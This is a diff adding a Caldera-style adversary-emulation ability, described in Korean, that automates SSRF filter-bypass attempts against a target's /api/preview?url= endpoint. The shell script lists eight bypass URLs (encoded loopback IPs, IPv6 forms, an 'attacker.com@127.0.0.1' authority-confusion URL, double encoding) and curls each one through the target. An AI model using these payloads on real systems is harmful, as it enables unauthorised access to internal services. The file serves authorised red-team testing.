@@ -1,0 +1,61 @@
+- id: e3b4c5d6-e7f8-a9b0-c1d2-e3f4a5b6c7d8
+  name: SSRF Filter Bypass - IP Encoding and Redirects
+  description: SSRF 기본 필터(localhost/127.0.0.1 블랙리스트)를 우회하기 위한 다양한 기법을 테스트합니다. IP 주소 인코딩 변환(hex, octal, decimal), IPv6 루프백, DNS rebinding 시뮬레이션, 오픈 리다이렉트 체인 등을 사용합니다.
+  tactic: initial-access
+  technique:
+    attack_id: T1090
+    name: Proxy
+  platforms:
+    linux:
+      sh:
+        command: |-
+          OP_ID="#{operation_id}"
+          TECH_ID="T1090"
+          ABILITY_ID="e3b4c5d6-e7f8-a9b0-c1d2-e3f4a5b6c7d8"
+          TARGET="http://#{target.url}"
+
+          BYPASS_URLS=(
+            # 1. Decimal IP (127.0.0.1 = 2130706433)
+            "http://2130706433/"
+            # 2. Hex IP
+            "http://0x7f000001/"
+            # 3. Octal IP
+            "http://0177.0.0.01/"
+            # 4. IPv6 loopback
+            "http://[::1]/"
+            # 5. IPv6 mapped IPv4
+            "http://[::ffff:127.0.0.1]/"
+            # 6. Short notation
+            "http://127.1/"
+            # 7. URL with @ (user:pass@host confusion)
+            "http://attacker.com@127.0.0.1/"
+            # 8. Double URL encoding
+            "http://%31%32%37%2e%30%2e%30%2e%31/"
+          )
+
+          LABELS=(
+            "Decimal IP: 2130706433"
+            "Hex IP: 0x7f000001"
+            "Octal IP: 0177.0.0.01"
+            "IPv6 loopback: [::1]"
+            "IPv6 mapped: [::ffff:127.0.0.1]"
+            "Short notation: 127.1"
+            "URL authority confusion: attacker@127.0.0.1"
+            "Double URL encoding: %31%32%37..."
+          )
+
+          echo "[*] SSRF Filter Bypass — testing IP encoding variants"
+          for i in "${!BYPASS_URLS[@]}"; do
+            echo "[*] Bypass $((i+1)): ${LABELS[$i]}"
+            ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${BYPASS_URLS[$i]}', safe=''))")
+            RESULT=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 \
+              -H "X-Caldera-Op-Id: ${OP_ID}" \
+              -H "X-Caldera-Technique: ${TECH_ID}" \
+              -H "X-Caldera-Ability: ${ABILITY_ID}" \
+              -A "Caldera/${OP_ID}/${TECH_ID}/${ABILITY_ID}" \
+              "${TARGET}/api/preview?url=${ENCODED}")
+            echo "[+] HTTP ${RESULT}"
+          done
+        parsers:
+          plugins.stockpile.app.parsers.basic:
+          - source: host.vuln.ssrf.bypass
